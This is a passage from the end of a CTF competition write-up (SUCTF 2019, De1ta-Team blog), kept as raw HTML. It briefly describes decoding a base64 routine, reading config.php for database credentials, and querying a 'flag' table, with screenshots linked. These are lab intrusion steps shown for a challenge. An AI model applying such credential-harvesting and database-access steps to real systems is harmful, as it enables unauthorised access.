class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v2[v5] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问了一下队里面的re师傅，说这个是base64，尝试一下发现可以</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162510-dc15f934-c25a-1.png" alt="image.png"></p>
<p>但是发现都找不到flag，通过之前扫描出来的<code>config.php</code>，猜测flag应该在数据库里面，读一下config文件得到数据库用户密码</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162734-31db9194-c25b-1.png" alt="image.png"></p>
<p><code>show databases</code>一下<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162955-85c05ce0-c25b-1.png" alt="image.png"></p>
<p><code>use flag;show tables</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819163517-45b571e8-c25c-1.png" alt="image.png"></p>
<p><code>select * from flag.flag</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819163559-5efc045a-c25c-1.png" alt="image.png"></p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/ctf/">#ctf</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/writeup/">#writeup</a> <a href="/tags/suctf/">#suctf</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/SUCTF2019/">SUCTF 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/08/de1ctf2019 Writeup/">De1ctf 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/06/24/sctf2019/">SCTF 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>